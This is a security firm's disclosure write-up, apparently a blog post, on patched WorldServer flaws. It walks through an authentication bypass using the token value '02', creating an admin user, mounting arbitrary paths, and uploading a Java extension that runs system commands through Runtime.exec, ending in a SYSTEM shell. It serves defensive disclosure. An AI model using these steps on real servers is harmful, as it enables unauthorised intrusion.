    <h1 class="gp-heroRich__title gp-heroRich__title_light">
    Vulnerabilities in RWS WorldServer
      
    </h1>
  
  <h4 class="gp-heroRich__subtitle">Cyber Wonderland</h4>
  <p class="gp-heroRich__text">Brecht Snijders, Principal Security Consultant</p>
  

          </div>
        
    </div>
  </div>
</div>


  </div>
</div>
</div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-4 dnd-section module_1599470825022380-row-2-max-width-section-centering">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-cell dnd-column" style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-5 dnd-row">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1599470825022380-module-3" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">


<div id="" class="gp-block gp-block_paddings-small gp-block_light gp-block_bottom-none gp-content gp-content_col-8">
  <div class="gp-content__container">
    

    
    
    
    
    <div class="gp-content__row">
      
      
<div class="gp-content__info">
  
  <div class="gp-content__infoRte"><p><span data-contrast="auto">Some time ago we had the opportunity to look at the WorldServer web software, a translation management product built by RWS Group (originally built by SDL, which was acquired by RWS group in late 2020). </span></p>
<p><span data-contrast="auto">The software was approached from an unauthenticated perspective and several critical vulnerabilities were discovered, including a backdoor-like functionality which allowed for a full authentication bypass, pre-authenticated insecure java deserialisation, authenticated blind SSRF and privilege escalation, each ultimately resulting in Remote Code Execution. </span></p>
<p><span data-contrast="auto">The vulnerabilities detailed in this write-up have been responsibly disclosed to the vendor over a year ago and have since been resolved. Customers running the software should ensure they are on the latest version. </span></p>
<p><span data-contrast="auto">The main takeaways for penetration testers should be to always read documentation if it is available, which is how we found the initial critical vulnerability.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:153,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-contrast="auto">All testing was performed on version 11.3.5.4758. The vulnerabilities described in this write-up were discovered by <a href="https://www.linkedin.com/in/brechtsn/" rel="noopener" target="_blank">Brecht Snijders, Principal Security Consultant </a>and Daniel Le Souef.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:247,&quot;335559738&quot;:106,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p>&nbsp;</p>
<h3 aria-level="1"><strong><span data-contrast="auto">That’s what we’re Token about - CVE-2022-34267</span></strong><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:202,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></h3>
<p><span data-contrast="auto">When we first started looking at WorldServer, no public vulnerabilities or CVEs existed for this software, which is always an interesting observation. Since we knew nothing about the software, we started with reading the documentation, which is </span><a href="https://docs.rws.com/publications/WorldServer%20(800)/sdl%20worldserver%2011.4"><span data-contrast="auto">available at </span><span data-contrast="auto">htt</span><span data-contrast="auto">p</span><span data-contrast="auto">s://docs.rws.com/publications/WorldServer (800)/sdl worldserver11.3.&nbsp;</span></a></p>
<p><span data-contrast="auto">What stood out immediately was the use of session tokens as a GET or</span><span data-contrast="auto"> POST parameter to query the API, for example this API call from the documentation:</span> <span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:87,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<pre class="code code-wrap"><code>&lt;protocol&gt;://&lt;ws-host&gt;:&lt;ws-port&gt;/ws-api/v2/info?token=&lt;sessionId&gt;</code></pre>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:0,&quot;335559737&quot;:0,&quot;335559738&quot;:10,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><span data-contrast="auto" xml:lang="EN-US" lang="EN-US">With no further information on what type of token it required, we fuzzed the token parameter using ffuf with the hope of triggering some verbose errors that might give us more information about what the token parameter is expected to look like. To our great surprise, one particular token value stood out from the others:</span>&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:0,&quot;335559737&quot;:0,&quot;335559738&quot;:9,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;<img src="https://www.triskelelabs.com/hs-fs/hubfs/2.png?width=785&amp;height=332&amp;name=2.png" width="785" height="332" loading="lazy" alt="2" style="height: auto; max-width: 100%; width: 785px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/2.png?width=393&amp;height=166&amp;name=2.png 393w, https://www.triskelelabs.com/hs-fs/hubfs/2.png?width=785&amp;height=332&amp;name=2.png 785w, https://www.triskelelabs.com/hs-fs/hubfs/2.png?width=1178&amp;height=498&amp;name=2.png 1178w, https://www.triskelelabs.com/hs-fs/hubfs/2.png?width=1570&amp;height=664&amp;name=2.png 1570w, https://www.triskelelabs.com/hs-fs/hubfs/2.png?width=1963&amp;height=830&amp;name=2.png 1963w, https://www.triskelelabs.com/hs-fs/hubfs/2.png?width=2355&amp;height=996&amp;name=2.png 2355w" sizes="(max-width: 785px) 100vw, 785px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">To</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">confirm</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">what</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">had</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">just</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">stumbled</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">upon,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">used</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Burp</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">repeat</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">request:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/3.png?width=785&amp;height=626&amp;name=3.png" width="785" height="626" loading="lazy" alt="3" style="height: auto; max-width: 100%; width: 785px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/3.png?width=393&amp;height=313&amp;name=3.png 393w, https://www.triskelelabs.com/hs-fs/hubfs/3.png?width=785&amp;height=626&amp;name=3.png 785w, https://www.triskelelabs.com/hs-fs/hubfs/3.png?width=1178&amp;height=939&amp;name=3.png 1178w, https://www.triskelelabs.com/hs-fs/hubfs/3.png?width=1570&amp;height=1252&amp;name=3.png 1570w, https://www.triskelelabs.com/hs-fs/hubfs/3.png?width=1963&amp;height=1565&amp;name=3.png 1963w, https://www.triskelelabs.com/hs-fs/hubfs/3.png?width=2355&amp;height=1878&amp;name=3.png 2355w" sizes="(max-width: 785px) 100vw, 785px"></span></p>
<p style="font-size: 14px;"><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:0,&quot;335559737&quot;:0,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">This was quite the interesting find - adding a token parameter with the value of <span style="background-color: #ededed;">02</span> somehow bypassed all authentication requirements. Digging further into the documentation, we found an API call that would return the current user details to us:</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:0,&quot;335559737&quot;:0,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:314}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/4-1.png?width=563&amp;height=668&amp;name=4-1.png" width="563" height="668" loading="lazy" alt="4-1" style="height: auto; max-width: 100%; width: 563px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/4-1.png?width=282&amp;height=334&amp;name=4-1.png 282w, https://www.triskelelabs.com/hs-fs/hubfs/4-1.png?width=563&amp;height=668&amp;name=4-1.png 563w, https://www.triskelelabs.com/hs-fs/hubfs/4-1.png?width=845&amp;height=1002&amp;name=4-1.png 845w, https://www.triskelelabs.com/hs-fs/hubfs/4-1.png?width=1126&amp;height=1336&amp;name=4-1.png 1126w, https://www.triskelelabs.com/hs-fs/hubfs/4-1.png?width=1408&amp;height=1670&amp;name=4-1.png 1408w, https://www.triskelelabs.com/hs-fs/hubfs/4-1.png?width=1689&amp;height=2004&amp;name=4-1.png 1689w" sizes="(max-width: 563px) 100vw, 563px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">Having</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">access</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">system</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">user</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">seems</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">bad,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">but</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">so</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">far</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">just</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">have</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">access</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the API</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">of</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">a</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">product</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we’re</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">unfamiliar</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">with</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">and</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">no</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">other</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">way</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">of</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">actually</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">logging</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">in.</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">There also did not seem to be a way to create a new user using the API according to the documentation.</span><span data-ccp-parastyle="Body Text"> </span></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">There</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">was</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">however</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">one</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">interesting</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">bit</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">about</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">customising</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">REST</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;API at </span><a href="https://docs.rws.com/791697/585715/sdl-worldserver-11-3-developer-documentation/customizing-the-rest-api"><span data-contrast="auto">htt</span><span data-contrast="auto">p</span><span data-contrast="auto">s://docs.rws.com/791697/585715/sdl-worldserver-11-3-developer-</span><span data-contrast="auto"> </span><span data-contrast="auto">documentation/customizin</span><span data-contrast="auto">g</span><span data-contrast="auto">-the-rest-api</span><span data-contrast="auto">. </span></a><span data-contrast="auto">It did mention that the WorldServer SDK would be required, which we did not have access to at this stage.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:533,&quot;335559738&quot;:71,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-contrast="auto">Some further enumeration disclosed the existence of an Apache Axis webservice endpoint at <span style="background-color: #ededed;">/ws-legacy/services</span>, </span><span data-contrast="auto">disclosing a wealth of available services to call with the respective wsdl files and the required information to easily interact with them.</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:304}">&nbsp;</span></p>
<p><span data-contrast="auto">This also included a UserWSUserManager service, with a createUser function:</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:13,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:13,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/5.png?width=449&amp;height=525&amp;name=5.png" width="449" height="525" loading="lazy" alt="5" style="height: auto; max-width: 100%; width: 449px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/5.png?width=225&amp;height=263&amp;name=5.png 225w, https://www.triskelelabs.com/hs-fs/hubfs/5.png?width=449&amp;height=525&amp;name=5.png 449w, https://www.triskelelabs.com/hs-fs/hubfs/5.png?width=674&amp;height=788&amp;name=5.png 674w, https://www.triskelelabs.com/hs-fs/hubfs/5.png?width=898&amp;height=1050&amp;name=5.png 898w, https://www.triskelelabs.com/hs-fs/hubfs/5.png?width=1123&amp;height=1313&amp;name=5.png 1123w, https://www.triskelelabs.com/hs-fs/hubfs/5.png?width=1347&amp;height=1575&amp;name=5.png 1347w" sizes="(max-width: 449px) 100vw, 449px"></span></p>
<p style="font-size: 14px;"><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:13,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><span data-contrast="auto" xml:lang="EN-US" lang="EN-US">Using the amazing Wsdler Burp extension, we quickly created a new createUser request and sent it off, using our system token of <span style="background-color: #ededed;">02</span>:</span></span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:13,&quot;335559739&quot;:0,&quot;335559740&quot;:240}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/6-1.png?width=743&amp;height=720&amp;name=6-1.png" width="743" height="720" loading="lazy" alt="6-1" style="height: auto; max-width: 100%; width: 743px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/6-1.png?width=372&amp;height=360&amp;name=6-1.png 372w, https://www.triskelelabs.com/hs-fs/hubfs/6-1.png?width=743&amp;height=720&amp;name=6-1.png 743w, https://www.triskelelabs.com/hs-fs/hubfs/6-1.png?width=1115&amp;height=1080&amp;name=6-1.png 1115w, https://www.triskelelabs.com/hs-fs/hubfs/6-1.png?width=1486&amp;height=1440&amp;name=6-1.png 1486w, https://www.triskelelabs.com/hs-fs/hubfs/6-1.png?width=1858&amp;height=1800&amp;name=6-1.png 1858w, https://www.triskelelabs.com/hs-fs/hubfs/6-1.png?width=2229&amp;height=2160&amp;name=6-1.png 2229w" sizes="(max-width: 743px) 100vw, 743px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">After</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">receiving</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">a</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">200</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">HTTP</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">response,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">we</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">logged</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">in</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">successfully</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">with</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">our</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">new administrative user:</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:153,&quot;335559738&quot;:92,&quot;335559739&quot;:0,&quot;335559740&quot;:314}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/7.png?width=672&amp;height=547&amp;name=7.png" width="672" height="547" loading="lazy" alt="7" style="height: auto; max-width: 100%; width: 672px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/7.png?width=336&amp;height=274&amp;name=7.png 336w, https://www.triskelelabs.com/hs-fs/hubfs/7.png?width=672&amp;height=547&amp;name=7.png 672w, https://www.triskelelabs.com/hs-fs/hubfs/7.png?width=1008&amp;height=821&amp;name=7.png 1008w, https://www.triskelelabs.com/hs-fs/hubfs/7.png?width=1344&amp;height=1094&amp;name=7.png 1344w, https://www.triskelelabs.com/hs-fs/hubfs/7.png?width=1680&amp;height=1368&amp;name=7.png 1680w, https://www.triskelelabs.com/hs-fs/hubfs/7.png?width=2016&amp;height=1641&amp;name=7.png 2016w" sizes="(max-width: 672px) 100vw, 672px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">Browsing</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">web</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">application,</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">our</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">eyes</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">landed</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">on</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">‘Asset</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Interface</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">System’</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">page, which </span><span data-ccp-parastyle="Body Text">contained</span><span data-ccp-parastyle="Body Text"> an ‘AIS Mounts’ configuration page.</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:216,&quot;335559739&quot;:0,&quot;335559740&quot;:314}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:119,&quot;335559737&quot;:0,&quot;335559738&quot;:216,&quot;335559739&quot;:0,&quot;335559740&quot;:314}"><img src="https://www.triskelelabs.com/hs-fs/hubfs/8.png?width=505&amp;height=407&amp;name=8.png" width="505" height="407" loading="lazy" alt="8" style="height: auto; max-width: 100%; width: 505px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/8.png?width=253&amp;height=204&amp;name=8.png 253w, https://www.triskelelabs.com/hs-fs/hubfs/8.png?width=505&amp;height=407&amp;name=8.png 505w, https://www.triskelelabs.com/hs-fs/hubfs/8.png?width=758&amp;height=611&amp;name=8.png 758w, https://www.triskelelabs.com/hs-fs/hubfs/8.png?width=1010&amp;height=814&amp;name=8.png 1010w, https://www.triskelelabs.com/hs-fs/hubfs/8.png?width=1263&amp;height=1018&amp;name=8.png 1263w, https://www.triskelelabs.com/hs-fs/hubfs/8.png?width=1515&amp;height=1221&amp;name=8.png 1515w" sizes="(max-width: 505px) 100vw, 505px"></span></p>
<p><span data-contrast="auto">It turns out this lets us mount any path on the file system:</span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:0,&quot;335559738&quot;:214,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span></p>
<p><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:0,&quot;335559737&quot;:0,&quot;335559738&quot;:0,&quot;335559739&quot;:0,&quot;335559740&quot;:240}">&nbsp;</span><img src="https://www.triskelelabs.com/hs-fs/hubfs/9.png?width=397&amp;height=488&amp;name=9.png" width="397" height="488" loading="lazy" alt="9" style="height: auto; max-width: 100%; width: 397px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/9.png?width=199&amp;height=244&amp;name=9.png 199w, https://www.triskelelabs.com/hs-fs/hubfs/9.png?width=397&amp;height=488&amp;name=9.png 397w, https://www.triskelelabs.com/hs-fs/hubfs/9.png?width=596&amp;height=732&amp;name=9.png 596w, https://www.triskelelabs.com/hs-fs/hubfs/9.png?width=794&amp;height=976&amp;name=9.png 794w, https://www.triskelelabs.com/hs-fs/hubfs/9.png?width=993&amp;height=1220&amp;name=9.png 993w, https://www.triskelelabs.com/hs-fs/hubfs/9.png?width=1191&amp;height=1464&amp;name=9.png 1191w" sizes="(max-width: 397px) 100vw, 397px"></p>
<p><span data-ccp-parastyle="Body Text">From here, we can easily retrieve the WorldServer files, including the SDK, to build our custom API endpoint. Once we have the SDK, we followed the steps in the documentation to create our custom API:</span></p>
<pre class="code"><code>package com.sdl.lt.worldserver.customizations.newextension;
import java.io.IOException;
import com.idiominc.wssdk.WSContext;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.RequestMethod;
@RestController
@RequestMapping ("/extensions/test")
public class NewExtension
{
        @Autowired
        private WSContext context;
        @RequestMapping (value = "/clients", method = {RequestMethod.GET})
        public String test() throws Exception {
        try{
        Process p = Runtime.getRuntime)(.exec("INSERT COMMAND HERE");
        }
        catch (IOException exception){
        return "false";
        }
        return "PoC - Remote Code Execution";
        }
}</code></pre>
<p><span data-ccp-parastyle="Body Text">After building it with Maven, we can simply upload it using the authentication bypass:</span></p>
<p><span data-ccp-parastyle="Body Text"><img src="https://www.triskelelabs.com/hs-fs/hubfs/12.png?width=695&amp;height=762&amp;name=12.png" width="695" height="762" loading="lazy" alt="12" style="height: auto; max-width: 100%; width: 695px;" srcset="https://www.triskelelabs.com/hs-fs/hubfs/12.png?width=348&amp;height=381&amp;name=12.png 348w, https://www.triskelelabs.com/hs-fs/hubfs/12.png?width=695&amp;height=762&amp;name=12.png 695w, https://www.triskelelabs.com/hs-fs/hubfs/12.png?width=1043&amp;height=1143&amp;name=12.png 1043w, https://www.triskelelabs.com/hs-fs/hubfs/12.png?width=1390&amp;height=1524&amp;name=12.png 1390w, https://www.triskelelabs.com/hs-fs/hubfs/12.png?width=1738&amp;height=1905&amp;name=12.png 1738w, https://www.triskelelabs.com/hs-fs/hubfs/12.png?width=2085&amp;height=2286&amp;name=12.png 2085w" sizes="(max-width: 695px) 100vw, 695px"></span></p>
<p><span data-contrast="auto" xml:lang="EN-US" lang="EN-US"><span data-ccp-parastyle="Body Text">We</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">chose</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">a</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">simple</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">MSHTA</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">payload</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">using</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">Metasploit</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">to</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">demonstrate</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">the</span><span data-ccp-parastyle="Body Text"> </span><span data-ccp-parastyle="Body Text">impact, which resulted in a SYSTEM shell (a quick PoC is a good PoC):</span></span><span data-ccp-props="{&quot;134245417&quot;:false,&quot;201341983&quot;:0,&quot;335551550&quot;:1,&quot;335551620&quot;:1,&quot;335559685&quot;:120,&quot;335559737&quot;:153,&quot;335559738&quot;:93,&quot;335559739&quot;:0,&quot;335559740&quot;:314,&quot;335559991&quot;:1}">&nbsp;</span></p>
